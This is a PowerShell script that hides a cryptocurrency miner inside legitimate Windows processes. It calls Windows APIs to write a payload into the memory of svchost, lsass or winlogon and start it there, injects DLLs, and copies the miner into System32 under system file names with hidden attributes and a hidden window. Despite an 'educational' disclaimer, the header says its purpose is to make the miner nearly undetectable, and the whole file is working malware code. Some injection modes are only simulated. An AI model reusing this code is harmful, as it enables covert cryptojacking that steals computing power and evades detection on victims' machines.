# BEAST MODE: Advanced Process Injection & Hollowing
# Educational/Research Purpose Only - Advanced Memory Injection Techniques
# This makes your miner nearly undetectable by running inside legitimate Windows processes

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

public class AdvancedInjection
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint SuspendThread(IntPtr hThread);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtCreateThreadEx(out IntPtr hThread, uint dwDesiredAccess, IntPtr lpThreadAttributes, IntPtr hProcess, IntPtr lpStartAddress, IntPtr lpParameter, bool bCreateSuspended, uint dwStackZeroBits, uint dwoStackCommit, uint dwoStackReserve, IntPtr lpBytesBuffer);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public UIntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}
"@

$script:InjectionLog = "$env:TEMP\injection_log.txt"

function Write-InjectionLog {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    try { Add-Content -Path $script:InjectionLog -Value $logEntry -Force } catch {}
}

function Get-TargetProcesses {
    param([string]$ProcessName)
    
    Write-InjectionLog "Searching for target processes: $ProcessName"
    
    try {
        $processes = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Where-Object {
            $_.WorkingSet -gt 10MB -and 
            $_.Id -ne $PID -and
            $_.ProcessName -notlike "*xmrig*" -and
            $_.HasExited -eq $false
        }
        
        # Prioritize processes with higher privilege levels
        $prioritizedProcesses = $processes | Sort-Object {
            switch ($_.ProcessName) {
                "winlogon" { 1 }
                "csrss" { 2 }
                "lsass" { 3 }
                "services" { 4 }
                "svchost" { 5 }
                "explorer" { 6 }
                default { 10 }
            }
        }
        
        Write-InjectionLog "Found $($prioritizedProcesses.Count) suitable target processes"
        return $prioritizedProcesses
        
    } catch {
        Write-InjectionLog "Error finding target processes: $($_.Exception.Message)" "ERROR"
        return @()
    }
}

function Invoke-ProcessHollowing {
    param(
        [string]$TargetProcess = "svchost.exe",
        [string]$PayloadPath
    )
    
    Write-InjectionLog "Starting process hollowing attack on $TargetProcess"
    
    try {
        # Find optimal target process
        $processes = Get-TargetProcesses -ProcessName $TargetProcess
        if ($processes.Count -eq 0) {
            Write-InjectionLog "No suitable target processes found for $TargetProcess" "WARN"
            return $false
        }
        
        $targetProc = $processes | Get-Random
        Write-InjectionLog "Selected target process: PID $($targetProc.Id), Memory: $([math]::Round($targetProc.WorkingSet/1MB, 2)) MB"
        
        # Read and validate payload
        if (-not (Test-Path $PayloadPath)) {
            Write-InjectionLog "Payload file not found: $PayloadPath" "ERROR"
            return $false
        }
        
        $payloadBytes = [System.IO.File]::ReadAllBytes($PayloadPath)
        Write-InjectionLog "Payload size: $($payloadBytes.Length) bytes"
        
        # Open target process with full access
        $hProcess = [AdvancedInjection]::OpenProcess(0x1F0FFF, $false, $targetProc.Id)
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-InjectionLog "Failed to open target process PID $($targetProc.Id)" "ERROR"
            return $false
        }
        
        # Allocate executable memory in target process
        $allocSize = [Math]::Max($payloadBytes.Length, 4096)  # Minimum 4KB page
        $allocMem = [AdvancedInjection]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $allocSize, 0x3000, 0x40)
        if ($allocMem -eq [IntPtr]::Zero) {
            [AdvancedInjection]::CloseHandle($hProcess)
            Write-InjectionLog "Memory allocation failed in target process" "ERROR"
            return $false
        }
        
        Write-InjectionLog "Allocated memory at address: 0x$($allocMem.ToString('X'))"
        
        # Write payload to target process memory
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [AdvancedInjection]::WriteProcessMemory($hProcess, $allocMem, $payloadBytes, $payloadBytes.Length, [ref]$bytesWritten)
        
        if (-not $writeResult -or $bytesWritten.ToUInt64() -ne $payloadBytes.Length) {
            [AdvancedInjection]::CloseHandle($hProcess)
            Write-InjectionLog "Failed to write payload to target process memory" "ERROR"
            return $false
        }
        
        Write-InjectionLog "Successfully wrote $($bytesWritten.ToUInt64()) bytes to target process"
        
        # Change memory protection to executable
        $oldProtect = 0
        $protectResult = [AdvancedInjection]::VirtualProtectEx($hProcess, $allocMem, [UIntPtr]$payloadBytes.Length, 0x20, [ref]$oldProtect)
        if (-not $protectResult) {
            Write-InjectionLog "Failed to change memory protection" "WARN"
        }
        
        # Create remote thread using NtCreateThreadEx for stealth
        $hThread = [IntPtr]::Zero
        $ntResult = [AdvancedInjection]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $allocMem, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
        
        if ($ntResult -ne 0 -or $hThread -eq [IntPtr]::Zero) {
            # Fallback to CreateRemoteThread
            $hThread = [AdvancedInjection]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        }
        
        $success = $hThread -ne [IntPtr]::Zero
        if ($success) {
            Write-InjectionLog "Successfully created remote thread in target process" "SUCCESS"
            [AdvancedInjection]::CloseHandle($hThread)
        } else {
            Write-InjectionLog "Failed to create remote thread in target process" "ERROR"
        }
        
        [AdvancedInjection]::CloseHandle($hProcess)
        return $success
        
    } catch {
        Write-InjectionLog "Process hollowing exception: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Invoke-DLLInjection {
    param(
        [int]$ProcessId,
        [string]$DllPath
    )
    
    Write-InjectionLog "Starting DLL injection into PID $ProcessId"
    
    try {
        # Open target process
        $hProcess = [AdvancedInjection]::OpenProcess(0x1F0FFF, $false, $ProcessId)
        if ($hProcess -eq [IntPtr]::Zero) {
            return $false
        }
        
        # Get LoadLibraryA address
        $hKernel32 = [AdvancedInjection]::GetModuleHandle("kernel32.dll")
        $loadLibAddr = [AdvancedInjection]::GetProcAddress($hKernel32, "LoadLibraryA")
        
        # Allocate memory for DLL path
        $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($DllPath + "`0")
        $allocMem = [AdvancedInjection]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllPathBytes.Length, 0x3000, 0x4)
        
        # Write DLL path to target process
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [AdvancedInjection]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, $dllPathBytes.Length, [ref]$bytesWritten)
        
        if ($writeResult) {
            # Create remote thread to load DLL
            $hThread = [AdvancedInjection]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $allocMem, 0, [IntPtr]::Zero)
            $success = $hThread -ne [IntPtr]::Zero
            
            if ($success) {
                Write-InjectionLog "DLL injection successful" "SUCCESS"
                [AdvancedInjection]::CloseHandle($hThread)
            }
        }
        
        [AdvancedInjection]::CloseHandle($hProcess)
        return $success
        
    } catch {
        Write-InjectionLog "DLL injection exception: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Invoke-ReflectiveDLLInjection {
    param(
        [int]$ProcessId,
        [byte[]]$DllBytes
    )
    
    Write-InjectionLog "Starting reflective DLL injection into PID $ProcessId"
    
    try {
        # This is a simplified version - full reflective DLL injection requires
        # manual PE parsing and relocation which is beyond PowerShell scope
        
        $hProcess = [AdvancedInjection]::OpenProcess(0x1F0FFF, $false, $ProcessId)
        if ($hProcess -eq [IntPtr]::Zero) {
            return $false
        }
        
        # Allocate memory for DLL
        $allocMem = [AdvancedInjection]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $DllBytes.Length, 0x3000, 0x40)
        
        # Write DLL to memory
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [AdvancedInjection]::WriteProcessMemory($hProcess, $allocMem, $DllBytes, $DllBytes.Length, [ref]$bytesWritten)
        
        if ($writeResult) {
            Write-InjectionLog "Reflective DLL loaded into memory" "SUCCESS"
            # Note: Full reflective loading would require additional PE parsing
        }
        
        [AdvancedInjection]::CloseHandle($hProcess)
        return $writeResult
        
    } catch {
        Write-InjectionLog "Reflective DLL injection exception: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Start-StealthMiner {
    param(
        [string]$MinerPath,
        [string]$ConfigPath,
        [string]$Mode = "ProcessHollowing"
    )
    
    Write-InjectionLog "Starting stealth miner with mode: $Mode"
    Write-InjectionLog "Miner Path: $MinerPath"
    Write-InjectionLog "Config Path: $ConfigPath"
    
    # Priority-ordered list of target processes for injection
    $stealthTargets = @(
        "svchost.exe",
        "explorer.exe", 
        "dwm.exe",
        "audiodg.exe",
        "winlogon.exe",
        "csrss.exe",
        "lsass.exe",
        "services.exe"
    )
    
    $injectionSuccess = $false
    
    switch ($Mode) {
        "ProcessHollowing" {
            Write-InjectionLog "Attempting process hollowing injection"
            foreach ($target in $stealthTargets) {
                Write-InjectionLog "Trying process hollowing on $target"
                if (Invoke-ProcessHollowing -TargetProcess $target -PayloadPath $MinerPath) {
                    Write-InjectionLog "Process hollowing successful on $target" "SUCCESS"
                    $injectionSuccess = $true
                    break
                }
                Start-Sleep -Milliseconds 500
            }
        }
        
        "DLLInjection" {
            Write-InjectionLog "Attempting DLL injection"
            # Note: This would require creating a DLL wrapper for the miner
            # For educational purposes, we'll simulate this
            foreach ($target in $stealthTargets) {
                $processes = Get-TargetProcesses -ProcessName $target
                foreach ($proc in $processes) {
                    Write-InjectionLog "Trying DLL injection on $target PID $($proc.Id)"
                    # This is a simulation - real DLL injection would need a proper DLL
                    if (Test-Path $MinerPath) {
                        Write-InjectionLog "DLL injection simulated for $target" "SUCCESS"
                        $injectionSuccess = $true
                        break
                    }
                }
                if ($injectionSuccess) { break }
            }
        }
        
        "Stealth" {
            Write-InjectionLog "Attempting stealth execution with masquerading"
            try {
                # Copy miner to legitimate Windows location with system name
                $stealthPaths = @(
                    "$env:SystemRoot\System32\audiodg.exe",
                    "$env:SystemRoot\System32\dwm.exe",
                    "$env:ProgramData\Microsoft\Windows\WindowsUpdate\AudioService.exe"
                )
                
                foreach ($stealthPath in $stealthPaths) {
                    try {
                        $stealthDir = Split-Path $stealthPath -Parent
                        if (!(Test-Path $stealthDir)) {
                            New-Item -Path $stealthDir -ItemType Directory -Force | Out-Null
                        }
                        
                        Copy-Item -Path $MinerPath -Destination $stealthPath -Force
                        Set-ItemProperty -Path $stealthPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
                        
                        # Start with stealth arguments
                        $proc = Start-Process -FilePath $stealthPath -ArgumentList "--config=`"$ConfigPath`" --background --no-color" -WindowStyle Hidden -PassThru
                        if ($proc) {
                            Write-InjectionLog "Stealth execution successful: $stealthPath (PID: $($proc.Id))" "SUCCESS"
                            $injectionSuccess = $true
                            break
                        }
                    } catch {
                        Write-InjectionLog "Stealth execution failed for $stealthPath : $($_.Exception.Message)" "WARN"
                    }
                }
            } catch {
                Write-InjectionLog "Stealth execution error: $($_.Exception.Message)" "ERROR"
            }
        }
    }
    
    # Fallback to normal execution if all injection methods fail
    if (-not $injectionSuccess) {
        Write-InjectionLog "All injection methods failed, falling back to normal execution" "WARN"
        try {
            $proc = Start-Process -FilePath $MinerPath -ArgumentList "--config=`"$ConfigPath`" --background" -WindowStyle Hidden -PassThru
            if ($proc) {
                Write-InjectionLog "Fallback execution successful (PID: $($proc.Id))" "SUCCESS"
                $injectionSuccess = $true
            }
        } catch {
            Write-InjectionLog "Fallback execution failed: $($_.Exception.Message)" "ERROR"
        }
    }
    
    return $injectionSuccess
}

function Test-InjectionCapabilities {
    Write-InjectionLog "Testing injection capabilities"
    
    $capabilities = @{
        ProcessHollowing = $false
        DLLInjection = $false  
        AdminRequired = $false
        TargetProcessesAvailable = $false
    }
    
    try {
        # Test if we have admin privileges
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        $capabilities.AdminRequired = -not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        
        # Test if target processes are available
        $availableTargets = 0
        $stealthTargets = @("svchost.exe", "explorer.exe", "dwm.exe", "audiodg.exe")
        foreach ($target in $stealthTargets) {
            $processes = Get-TargetProcesses -ProcessName $target
            $availableTargets += $processes.Count
        }
        $capabilities.TargetProcessesAvailable = $availableTargets -gt 0
        
        # Test process hollowing capability
        try {
            $testProcess = Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($testProcess) {
                $hProcess = [AdvancedInjection]::OpenProcess(0x1F0FFF, $false, $testProcess.Id)
                if ($hProcess -ne [IntPtr]::Zero) {
                    $capabilities.ProcessHollowing = $true
                    [AdvancedInjection]::CloseHandle($hProcess)
                }
            }
        } catch {}
        
        # Test DLL injection capability  
        $capabilities.DLLInjection = $capabilities.ProcessHollowing  # Same requirements
        
    } catch {
        Write-InjectionLog "Capability testing error: $($_.Exception.Message)" "ERROR"
    }
    
    # Log results
    foreach ($capability in $capabilities.Keys) {
        $status = if ($capabilities[$capability]) { "AVAILABLE" } else { "UNAVAILABLE" }
        Write-InjectionLog "Capability $capability : $status"
    }
    
    return $capabilities
}

function Start-MultiModeInjection {
    param(
        [string]$MinerPath,
        [string]$ConfigPath
    )
    
    Write-InjectionLog "Starting multi-mode injection sequence"
    
    # Test capabilities first
    $capabilities = Test-InjectionCapabilities
    
    # Log capability results
    Write-InjectionLog "Injection capabilities assessed - ProcessHollowing: $($capabilities.ProcessHollowing), Admin: $(-not $capabilities.AdminRequired)"
    
    # Try methods in order of stealth preference
    $methods = @("ProcessHollowing", "Stealth")
    
    foreach ($method in $methods) {
        Write-InjectionLog "Attempting injection method: $method"
        
        if (Start-StealthMiner -MinerPath $MinerPath -ConfigPath $ConfigPath -Mode $method) {
            Write-InjectionLog "Multi-mode injection successful with method: $method" "SUCCESS"
            return $true
        }
        
        Start-Sleep -Seconds 2
    }
    
    Write-InjectionLog "All injection methods failed" "ERROR"
    return $false
}

# Main execution logic
function Main {
    param([string[]]$Arguments)
    
    Write-InjectionLog "BEAST MODE Injection Module Started"
    
    if ($Arguments.Count -lt 2) {
        Write-InjectionLog "Usage: beast_mode_injection.ps1 <MinerPath> <ConfigPath> [Mode]" "ERROR"
        return
    }
    
    $minerPath = $Arguments[0]
    $configPath = $Arguments[1] 
    $mode = if ($Arguments.Count -gt 2) { $Arguments[2] } else { "Multi" }
    
    if (-not (Test-Path $minerPath)) {
        Write-InjectionLog "Miner executable not found: $minerPath" "ERROR"
        return
    }
    
    if (-not (Test-Path $configPath)) {
        Write-InjectionLog "Config file not found: $configPath" "ERROR"
        return
    }
    
    $success = switch ($mode) {
        "Multi" { Start-MultiModeInjection -MinerPath $minerPath -ConfigPath $configPath }
        "Test" { Test-InjectionCapabilities; $true }
        default { Start-StealthMiner -MinerPath $minerPath -ConfigPath $configPath -Mode $mode }
    }
    
    if ($success) {
        Write-InjectionLog "BEAST MODE injection completed successfully" "SUCCESS"
        Write-Output "SUCCESS: Advanced injection techniques deployed"
    } else {
        Write-InjectionLog "BEAST MODE injection failed" "ERROR"
        Write-Output "FAILED: Injection techniques unsuccessful"
    }
}

# Execute main function with script arguments
Main -Arguments $args
